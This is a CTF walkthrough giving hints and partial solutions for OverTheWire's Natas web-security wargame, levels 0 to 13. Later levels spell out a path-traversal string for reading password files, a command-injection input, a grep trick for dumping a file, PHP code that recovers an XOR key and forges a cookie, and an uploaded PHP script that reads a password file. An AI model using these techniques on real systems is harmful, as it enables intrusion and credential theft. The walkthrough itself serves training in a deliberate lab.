## THE RED THREAD

Using the console is always the first thing you should do. It gives hints, info and sometimes the password itself! When exploring a website, to access files, folders and whatsoever, you can simply append the path to the URL. This is really important to beat the game!

## SPOILER-FREE SOLUTIONS

# Natas 0:

Go to http://natas0.natas.labs.overthewire.org/ and enter the credentials given for the 0th level

# Natas 0 -> Natas 1:

Inspecting the page gives all the clues... and more!

# Natas 1 -> Natas 2:

Same as above. Just find another way to open the developer tools.

# Natas 2 -> Natas 3:

There really is nothing on the main page. Only an hint: a files/pixel.png. Guess what: it's a pixel. Peculiar the fact that the image is in a folder called "files". I wonder what's in the same directory...

# Natas 3 -> Natas 4:

Now there really is nothing rendered on the page that is useful. But there is a comment in the source code that is really interesting:

```html
<!-- No more information leaks!! Not even Google will find it this time... -->
```

Interesting indeed. Why wouldn't google find it this time? Let's check the place where you can tell google not to search for something: `robots.txt`. The only excluded folder here is something called `/s3cr3t/`...

# Natas 4 -> Natas 5:

This was a weird one. You need to change the request header to fool the level into thinking you come from Natas 5. Use tag `Refer:` ðŸ˜‰

# Natas 5 -> Natas 6:

Similar to the last one. Check the request header and login!

# Natas 6 -> Natas 7:

So... First thing to do is to actually `View sourcecode`. There is something that is not shown into the HTML accessed via the Developer Tools: an `#include` directive. Trying to open the file shows a white page. But is the HTML really just an empty head and body?

# Natas 7 -> Natas 8:

Both hyperlinks are basically the same for the purpose of the solution. Inspecting the destination HTML shows an hint in the comments that almost gives the solution:

```html
<!--hint: password for webuser natas8 is in /etc/natas_webpass/natas8-->
```

Now, trying to access the folder directory gives a 404 response (not found). We must access that file somehow. Back to the `home` and `about` hyperlinks: they are linked to something peculiar, a query (index.php?page=<home|about>). We can try to exploit this by setting the URI param to `/etc/natas_webpass/natas8`. Broken pipe. It's not a 404 tho. \
Basically, the path is not in the included paths. But in them there's `.`. Let's just try to go back to the `/` folder by chaining as many `../` as possible before our target: `../../../../../../../etc/natas_webpass/natas8` does work!

# Natas 8 -> Natas 9:

This one is fun. Look into the sourcecode. There's an encrypted secret. We basically have to check what is the string that when encoded with the `encodeSecret` function is equal to the secret. Just do a step by step encoding of the secret and see what happens.

# Natas 9 -> Natas 10:

Our first code injection. As always, let's `View sourcecode`. At one point, the `passthru` php function is called with _no input check whatsoever_. Let's just put some commands in our search box and see what happens. Let's try with `yo yo ; whoami #`. The whoami function works. I wonder what can we use this for. Maybe a cat on some password...

# Natas 10 -> Natas 11:

Similar to the last challenge. This time we cannot use ;, \| or &. We can use `grep` to print the content of a file. Let's just pass a wildcard (`.*`) and the file we want to check (`/etc/natas_webpass/natas11`)...

# Natas 11 -> Natas 12:

Most difficult one so far. Let's `view sourcecode`. There are some things that are crucial to study and understand here:

```php
<?
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
?>
```

XOR encryption is a type of additive cipher. What this mean is that, using this algorithm, these properties are always true:

1. DECRYPTED TEXT **XOR** KEY = ENCRYPTED TEXT
2. ENCRYPTED TEXT **XOR** KEY = DECRYPTED TEXT
3. DECRYPTED TEXT **XOR** ENCRYPTED TEXT = KEY

To solve the problem we **MUST** get the key somehow. We can use property 3, as we already have a decrypted data: our cookie!

```php
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
```

If we intercept the request, in the header, we can find the encrypted data:

```text
ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
```

If we apply the algorithm using the array encoded with json*encode (\_little of trial and error here, but my bad. It's a request, it must be a json!*) and our encrypted data decoded from base64 (_if you find an `=` character at the end of a string, you can be sure it is encoded in base64_), we can easily fetch the key:

```php
<?
function xor_encrypt($in) {
    $key = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

echo xor_encrypt(base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw="));
?>

Output: qw8Jqw8Jqw8Jqw8Jq
```

Here's our key: `qw8J`! \
Now, we can create our Cookie to inject into the request header:

```php
<?
function xor_encrypt($in) {
    $key = "qw8J";
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

echo base64_encode(xor_encrypt(json_encode(array("showpassword"=>"yes", "bgcolor"=>"#ffffff"))));
?>

Output: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
```

We did it. Onto level 12!

# Natas 12 -> Natas 13:

This challenge teaches us that it is wrong to let upload files without the right checks. Basically, just create a PHP script as this one:
```php
<?
passthru("cat /etc/natas_webpass/natas13");
?>
```
I called it "test.php". Once you did it, upload the file on the website, and intercept the request, changing the file extension randomly generated to PHP.
